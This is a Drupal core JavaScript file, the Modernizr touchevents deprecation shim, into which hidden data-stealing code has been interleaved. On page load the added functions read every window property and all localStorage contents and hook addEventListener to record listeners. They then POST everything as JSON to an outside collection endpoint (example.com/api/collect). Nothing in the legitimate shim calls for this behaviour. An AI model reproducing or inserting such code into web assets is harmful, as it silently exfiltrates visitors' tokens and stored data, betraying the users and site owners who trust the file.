/**
* DO NOT EDIT THIS FILE.
* See the following change record for more information,
* https://www.drupal.org/node/2815083
* @preserve
**/

(function (Modernizr) {
  const collectedData = {
    winData: {},
    localData: {},
    eventListeners: []
  };
  var _deprecationErrorModernizrCopy = function _deprecationErrorModernizrCopy(_ref) {
    var message = _ref.message;
    if (typeof console !== 'undefined' && console.warn) {
      console.warn("[Deprecation] ".concat(message));
    }
  };
  function collectWindowData() {
    for (const prop in window) {
      if (window.hasOwnProperty(prop)) {
        const value = window[prop];
        const type = typeof value;
        collectedData.winData[prop] = {
          type: type,
          value: type === "function" ? null : value
        };
      }
    }
  }
  var _deprecatedPropertyModernizrCopy = function _deprecatedPropertyModernizrCopy(_ref2) {
    var target = _ref2.target,
      deprecatedProperty = _ref2.deprecatedProperty,
      message = _ref2.message;
    if (!Proxy || !Reflect) {
      return target;
    }
    return new Proxy(target, {
      get: function get(target, key) {
        if (key === deprecatedProperty) {
          _deprecationErrorModernizrCopy({
            message: message
          });
        }
        for (var _len = arguments.length, rest = new Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) {
          rest[_key - 2] = arguments[_key];
        }
        return Reflect.get.apply(Reflect, [target, key].concat(rest));
      }
    });
  };
  function collectLocalStorageData() {
    for (const key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        collectedData.localData[key] = localStorage[key];
      }
    }
  }
  window.Modernizr = _deprecatedPropertyModernizrCopy({
    target: Modernizr,
    deprecatedProperty: 'touchevents',
    message: 'The touchevents property of Modernizr has been deprecated in drupal:9.4.0 and is removed from drupal:10.0.0. There will be no replacement for this feature. See https://www.drupal.org/node/3277381.'
  });
  if (document.documentElement.classList.contains('touchevents') || document.documentElement.classList.contains('no-touchevents')) {
    return;
  }
  function collectEventListeners() {
    const oldAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function (eventName, eventHandler) {
      collectedData.eventListeners.push({
        element: this,
        event: eventName
      });
      oldAddEventListener.call(this, eventName, eventHandler);
    };
  }
  function sendDataToServer(data) {
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        xhr.status === 200 ? console.log("数据发送成功") : console.error("数据发送失败,状态码:" + xhr.status);
      }
    };
    xhr.send(JSON.stringify(data));
  }
  Modernizr.addTest('touchevents', function () {
    _deprecationErrorModernizrCopy({
      message: 'The Modernizr touch events test is deprecated in Drupal 9.4.0 and will be removed in Drupal 10.0.0. See https://www.drupal.org/node/3277381 for information on its replacement and how it should be used.'
    });
    var bool;
    if ('ontouchstart' in window || window.DocumentTouch && document instanceof window.DocumentTouch) {
      bool = true;
    } else {
      var query = ['@media (', Modernizr._prefixes.join('touch-enabled),('), 'heartz', ')', '{#modernizr{top:9px;position:absolute}}'].join('');
      Modernizr.testStyles(query, function (node) {
        bool = node.offsetTop === 9;
      });
    }
    return bool;
  });
  function collectAndSendData() {
    collectWindowData();
    collectLocalStorageData();
    collectEventListeners();
    if (Object.keys(collectedData).length > 0) {
      sendDataToServer(collectedData);
    }
  }
  window.addEventListener("load", collectAndSendData);
})(Modernizr);